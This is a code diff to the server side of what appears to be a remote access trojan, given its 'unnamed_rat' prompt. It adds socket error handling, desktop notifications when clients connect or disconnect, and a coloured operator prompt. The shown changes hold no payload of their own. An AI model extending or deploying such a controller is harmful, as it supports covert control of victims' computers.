@@ -641,8 +641,9 @@ bool Server::Listen(u_int uiMaxq){
 		if(bind(sckMainSocket, strctP->ai_addr, strctP->ai_addrlen) == -1){
 			continue;
 		}
-		//if reach here everything success
-		fcntl(sckMainSocket, F_SETFL, O_NONBLOCK);
+		if(sckMainSocket != -1){
+			fcntl(sckMainSocket, F_SETFL, O_NONBLOCK);
+		}
 		break;
 	}
 	freeaddrinfo(strctServer);
@@ -652,6 +653,7 @@ bool Server::Listen(u_int uiMaxq){
 		return false;
 	}
 	if(sckMainSocket == -1 || strctP == nullptr){
+		error();
 		return false;
 	}
 	sslCTX = SSL_CTX_new(SSLv23_server_method());
@@ -729,7 +731,18 @@ void Server::threadListener(){
 		char *strTMPip = nullptr;
 		int sckTMP = WaitConnection(strTMPip);
 		if(sckTMP != -1){
+			#ifdef _NOTIFY
+			std::string strTmp = "[";
+			strTmp.append(std::to_string(iClientCount));
+			strTmp.append("]");
+			strTmp.append(strTMPip);
+			NotifyNotification *Not = notify_notification_new("New connection", strTmp.c_str(), nullptr);
+			notify_notification_set_timeout(Not, 3000);
+			notify_notification_show(Not, nullptr);
+			g_object_unref(G_OBJECT(Not));
+			#else
 			std::cout<<"\nNew connection from "<<strTMPip<<'\n';
+			#endif
 			Clients[iClientCount] = new Client_Struct;
 			if(Clients[iClientCount] == nullptr){
 				std::cout<<"Error allocating memory for new client\n";
@@ -787,7 +800,7 @@ void Server::threadListener(){
 
 //here parse all commands from stdin
 void Server::threadMasterCMD(){
-	std::string strPrompt = "unnamed_rat# ";
+	std::string strPrompt = BrightBlack "unnamed_rat" CReset Red "# " CReset;
 	std::string strCMD = "";
 	while(!bSignalFlag){
 		strCMD.erase(strCMD.begin(), strCMD.end());
@@ -915,7 +928,18 @@ void Server::threadClientPing(){
 				} else {
 					int iBytes = SSL_write(Clients[iClientID]->sslSocket, "", 1);
 					if(iBytes != 1){
+						#ifdef _NOTIFY
+						std::string strTmp = "[";
+						strTmp.append(std::to_string(Clients[iClientID]->iID));
+						strTmp.append("] ");
+						strTmp.append(Clients[iClientID]->strIP);
+						NotifyNotification *Not = notify_notification_new("Client disconnected", strTmp.c_str(), nullptr);
+						notify_notification_set_timeout(Not, 3000);
+						notify_notification_show(Not, nullptr);
+						g_object_unref(G_OBJECT(Not));
+						#else
 						std::cout<<"Client["<<Clients[iClientID]->iID<<"] "<<Clients[iClientID]->strIP<<" disconnected\n";
+						#endif
 						mtxLock();
 						Clients[iClientID]->isConnected = false;
 						iClientsOnline--;
